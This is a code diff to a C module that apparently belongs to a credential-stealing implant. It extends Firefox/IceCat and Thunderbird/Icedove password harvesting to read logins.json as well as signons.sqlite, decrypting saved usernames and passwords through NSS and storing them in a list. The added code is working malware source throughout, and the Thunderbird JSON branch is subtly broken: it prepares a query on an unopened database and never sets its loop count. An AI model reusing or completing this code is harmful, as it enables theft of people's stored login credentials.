@@ -9,6 +9,7 @@
 #include <linux/limits.h>
 #include <dlfcn.h>
 #include <time.h>
+#include <json.h>
 #include <sqlite3.h>
 #include <nss/nss.h>
 #include <openssl/bio.h>
@@ -106,146 +107,277 @@ void *module_password_main(void *args)
 
 static void password_firefox(void)
 {
-   int i;
+   int i, j;
    glob_t g = {0};
    struct stat s;
    char *query = SO"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?";
    char *profile = NULL;
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
+   json_object *json = NULL, *logins = NULL, *e = NULL;
+   int loginsc = 0, timestamp = 0;
    const char *encuser, *encpass;
    SECStatus status = SECFailure;
    SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };
 
    do {
-      if(initlib(INIT_LIBSQLITE3|INIT_LIBNSS3)) break;
-      if(glob(SO"~/.mozilla/{firefox,icecat}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
+      if(initlib(INIT_LIBNSS3)) break;
 
-      for(i = 0; i < g.gl_pathc; i++) {
-         do {
-            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
-            if(!(profile = strdup(g.gl_pathv[i]))) break;
-            if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
-            if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
-            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
-            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
-            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
-            while(sqlite3_step(stmt) == SQLITE_ROW) {
-               do {
-                  encuser = sqlite3_column_text(stmt, 1);
-                  if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
-                  if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
-                  encpass = sqlite3_column_text(stmt, 2);
-                  if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
-                  if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
-                  /* TODO gestire con una lista */
-                  if(!list) {
-                     if(!(list = malloc(sizeof(struct entry)))) break;
-                     listp = list;
-                  } else {
-                     if(!(listp->next = malloc(sizeof(struct entry)))) break;
-                     listp = listp->next;
-                  }
+      do {
+         if(initlib(INIT_LIBSQLITE3)) break;
+         if(glob(SO"~/.mozilla/{firefox,icecat}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
 
-                  listp->next = NULL;
-                  listp->resource = SO"Firefox";
-                  listp->service = strdup(sqlite3_column_text(stmt, 0));
-                  if((listp->user = malloc(user.len + 1))) {
-                     memcpy(listp->user, (char *)user.data, user.len);
-                     listp->user[user.len] = '\0';
-                  }
-                  if((listp->pass = malloc(pass.len + 1))) {
-                     memcpy(listp->pass, (char *)pass.data, pass.len);
-                     listp->pass[pass.len] = '\0';
-                  }
-                  /* TODO */
-               } while(0);
-               if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
-               if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
-               if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
-               if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
-               if(profile) { free(profile); profile = NULL; }
-            }
-         } while(0);
-         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
-         if(db) { sqlite3_close(db); db = NULL; }
-         if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
-      }
+         for(i = 0; i < g.gl_pathc; i++) {
+            do {
+               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
+               if(!(profile = strdup(g.gl_pathv[i]))) break;
+               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
+               if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
+               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
+               while(sqlite3_step(stmt) == SQLITE_ROW) {
+                  do {
+                     encuser = sqlite3_column_text(stmt, 1);
+                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
+                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
+                     encpass = sqlite3_column_text(stmt, 2);
+                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
+                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
+                     /* TODO gestire con una lista */
+                     if(!list) {
+                        if(!(list = malloc(sizeof(struct entry)))) break;
+                        listp = list;
+                     } else {
+                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
+                        listp = listp->next;
+                     }
+
+                     listp->next = NULL;
+                     listp->resource = SO"Firefox";
+                     listp->service = strdup(sqlite3_column_text(stmt, 0));
+                     if((listp->user = malloc(user.len + 1))) {
+                        memcpy(listp->user, (char *)user.data, user.len);
+                        listp->user[user.len] = '\0';
+                     }
+                     if((listp->pass = malloc(pass.len + 1))) {
+                        memcpy(listp->pass, (char *)pass.data, pass.len);
+                        listp->pass[pass.len] = '\0';
+                     }
+                     /* TODO */
+                  } while(0);
+                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
+                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
+                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
+                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
+                  if(profile) { free(profile); profile = NULL; }
+               }
+            } while(0);
+            if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
+            if(db) { sqlite3_close(db); db = NULL; }
+            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
+         }
+      } while(0);
+      globfree(&g); memset(&g, 0x00, sizeof(g));
+
+      do {
+         if(glob(SO"~/.mozilla/{firefox,icecat}/*/logins.json", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
+
+         for(i = 0; i < g.gl_pathc; i++) {
+            do {
+               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
+               if(!(profile = strdup(g.gl_pathv[i]))) break;
+               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
+               if(!(json = json_object_from_file(g.gl_pathv[i]))) break;
+               if(!(logins = json_object_object_get(json, SO"logins"))) break;
+               loginsc = json_object_array_length(logins);
+               for(j = 0; j < loginsc; j++) {
+                  do {
+                     e = json_object_array_get_idx(logins, j);
+                     timestamp = (int)(json_object_get_double(json_object_object_get(e, SO"timePasswordChanged")) / (double)1000);
+                     if((timestamp < (int)begin) || (timestamp > end)) break;
+                     encuser = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedUsername"));
+                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
+                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
+                     encpass = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedPassword"));
+                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
+                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
+                     /* TODO gestire con una lista */
+                     if(!list) {
+                        if(!(list = malloc(sizeof(struct entry)))) break;
+                        listp = list;
+                     } else {
+                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
+                        listp = listp->next;
+                     }
+
+                     listp->next = NULL;
+                     listp->resource = SO"Firefox";
+                     listp->service = strdup((char *)json_object_get_string(json_object_object_get(e, SO"hostname")));
+                     if((listp->user = malloc(user.len + 1))) {
+                        memcpy(listp->user, (char *)user.data, user.len);
+                        listp->user[user.len] = '\0';
+                     }
+                     if((listp->pass = malloc(pass.len + 1))) {
+                        memcpy(listp->pass, (char *)pass.data, pass.len);
+                        listp->pass[pass.len] = '\0';
+                     }
+                     /* TODO */
+                  } while(0);
+                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
+                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
+                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
+                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
+                  if(profile) { free(profile); profile = NULL; }
+               }
+            } while(0);
+            if(json) { json_object_put(json); json = NULL; }
+            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
+         }
+      } while(0);
+      globfree(&g); memset(&g, 0x00, sizeof(g));
    } while(0);
-   globfree(&g);
 
    return;
 }
 
 static void password_thunderbird(void)
 {
-   int i;
+   int i, j;
    glob_t g = {0};
    struct stat s;
    char *query = SO"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?";
    char *profile = NULL;
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
+   json_object *json = NULL, *logins = NULL, *e = NULL;
+   int loginsc = 0, timestamp = 0;
    const char *encuser, *encpass;
    SECStatus status = SECFailure;
    SECItem *secuser = NULL, *secpass = NULL, user = { siBuffer, NULL, 0 }, pass = { siBuffer, NULL, 0 };
 
    do {
-      if(initlib(INIT_LIBSQLITE3|INIT_LIBNSS3)) break;
-      if(glob(SO"~/.{thunderbird,icedove}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
+      if(initlib(INIT_LIBNSS3)) break;
 
-      for(i = 0; i < g.gl_pathc; i++) {
-         do {
-            if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
-            if(!(profile = strdup(g.gl_pathv[i]))) break;
-            if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
-            if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
-            if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
-            if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
-            if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
-            while(sqlite3_step(stmt) == SQLITE_ROW) {
-               do {
-                  encuser = sqlite3_column_text(stmt, 1);
-                  if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
-                  if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
-                  encpass = sqlite3_column_text(stmt, 2);
-                  if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
-                  if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
-                  /* TODO gestire con una lista */
-                  if(!list) {
-                     if(!(list = malloc(sizeof(struct entry)))) break;
-                     listp = list;
-                  } else {
-                     if(!(listp->next = malloc(sizeof(struct entry)))) break;
-                     listp = listp->next;
-                  }
+      do {
+         if(initlib(INIT_LIBSQLITE3)) break;
+         if(glob(SO"~/.{thunderbird,icedove}/*/signons.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
 
-                  listp->next = NULL;
-                  listp->resource = SO"Thunderbird";
-                  listp->service = strdup(sqlite3_column_text(stmt, 0));
-                  if((listp->user = malloc(user.len + 1))) {
-                     memcpy(listp->user, (char *)user.data, user.len);
-                     listp->user[user.len] = '\0';
-                  }
-                  if((listp->pass = malloc(pass.len + 1))) {
-                     memcpy(listp->pass, (char *)pass.data, pass.len);
-                     listp->pass[pass.len] = '\0';
-                  }
-                  /* TODO */
-               } while(0);
-               if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
-               if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
-               if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
-               if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
-               if(profile) { free(profile); profile = NULL; }
-            }
-         } while(0);
-         if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
-         if(db) { sqlite3_close(db); db = NULL; }
-         if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
-      }
+         for(i = 0; i < g.gl_pathc; i++) {
+            do {
+               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
+               if(!(profile = strdup(g.gl_pathv[i]))) break;
+               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
+               if(sqlite3_open(g.gl_pathv[i], &db) != SQLITE_OK) break;
+               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
+               while(sqlite3_step(stmt) == SQLITE_ROW) {
+                  do {
+                     encuser = sqlite3_column_text(stmt, 1);
+                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
+                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
+                     encpass = sqlite3_column_text(stmt, 2);
+                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
+                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
+                     /* TODO gestire con una lista */
+                     if(!list) {
+                        if(!(list = malloc(sizeof(struct entry)))) break;
+                        listp = list;
+                     } else {
+                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
+                        listp = listp->next;
+                     }
+
+                     listp->next = NULL;
+                     listp->resource = SO"Thunderbird";
+                     listp->service = strdup(sqlite3_column_text(stmt, 0));
+                     if((listp->user = malloc(user.len + 1))) {
+                        memcpy(listp->user, (char *)user.data, user.len);
+                        listp->user[user.len] = '\0';
+                     }
+                     if((listp->pass = malloc(pass.len + 1))) {
+                        memcpy(listp->pass, (char *)pass.data, pass.len);
+                        listp->pass[pass.len] = '\0';
+                     }
+                     /* TODO */
+                  } while(0);
+                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
+                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
+                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
+                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
+                  if(profile) { free(profile); profile = NULL; }
+               }
+            } while(0);
+            if(stmt) { sqlite3_finalize(stmt); stmt = NULL; }
+            if(db) { sqlite3_close(db); db = NULL; }
+            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
+         }
+      } while(0);
+      globfree(&g); memset(&g, 0x00, sizeof(g));
+
+      do {
+         if(glob(SO"~/.{thunderbird,icedove}/*/logins.json", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
+
+         for(i = 0; i < g.gl_pathc; i++) {
+            do {
+               if(stat(g.gl_pathv[i], &s) || (s.st_mtime < begin)) break;
+               if(!(profile = strdup(g.gl_pathv[i]))) break;
+               if((status = NSS_Init(dirname(profile))) != SECSuccess) break;
+
+               if(!(json = json_object_from_file(g.gl_pathv[i]))) break;
+               if(!(logins = json_object_object_get(json, SO"logins"))) break;
+
+               if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 1, (int)begin) != SQLITE_OK) break;
+               if(sqlite3_bind_int(stmt, 2, (int)end) != SQLITE_OK) break;
+
+               for(j = 0; j < loginsc; j++) {
+                  do {
+                     e = json_object_array_get_idx(logins, j);
+                     timestamp = (int)(json_object_get_double(json_object_object_get(e, SO"timePasswordChanged")) / (double)1000);
+                     if((timestamp < (int)begin) || (timestamp > end)) break;
+                     encuser = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedUsername"));
+                     if(!(secuser = NSSBase64_DecodeBuffer(NULL, NULL, encuser, strlen(encuser)))) break;
+                     if(PK11SDR_Decrypt(secuser, &user, NULL) != SECSuccess) break;
+                     encpass = (char *)json_object_get_string(json_object_object_get(e, SO"encryptedPassword"));
+                     if(!(secpass = NSSBase64_DecodeBuffer(NULL, NULL, encpass, strlen(encpass)))) break;
+                     if(PK11SDR_Decrypt(secpass, &pass, NULL) != SECSuccess) break;
+                     /* TODO gestire con una lista */
+                     if(!list) {
+                        if(!(list = malloc(sizeof(struct entry)))) break;
+                        listp = list;
+                     } else {
+                        if(!(listp->next = malloc(sizeof(struct entry)))) break;
+                        listp = listp->next;
+                     }
+
+                     listp->next = NULL;
+                     listp->resource = SO"Thunderbird";
+                     listp->service = strdup((char *)json_object_get_string(json_object_object_get(e, SO"hostname")));
+                     if((listp->user = malloc(user.len + 1))) {
+                        memcpy(listp->user, (char *)user.data, user.len);
+                        listp->user[user.len] = '\0';
+                     }
+                     if((listp->pass = malloc(pass.len + 1))) {
+                        memcpy(listp->pass, (char *)pass.data, pass.len);
+                        listp->pass[pass.len] = '\0';
+                     }
+                     /* TODO */
+                  } while(0);
+                  if(encuser) { SECITEM_ZfreeItem(secuser, PR_TRUE); secuser = NULL; }
+                  if(encpass) { SECITEM_ZfreeItem(secpass, PR_TRUE); secpass = NULL; }
+                  if(user.data) { SECITEM_ZfreeItem(&user, PR_FALSE); user.data = NULL; }
+                  if(pass.data) { SECITEM_ZfreeItem(&pass, PR_FALSE); pass.data = NULL; }
+                  if(profile) { free(profile); profile = NULL; }
+               }
+            } while(0);
+            if(json) { json_object_put(json); json = NULL; }
+            if((status == SECSuccess) && NSS_Shutdown) { NSS_Shutdown(); status = SECFailure; }
+         }
+      } while(0);
+      globfree(&g); memset(&g, 0x00, sizeof(g));
    } while(0);
-   globfree(&g);
 
    return;
 }
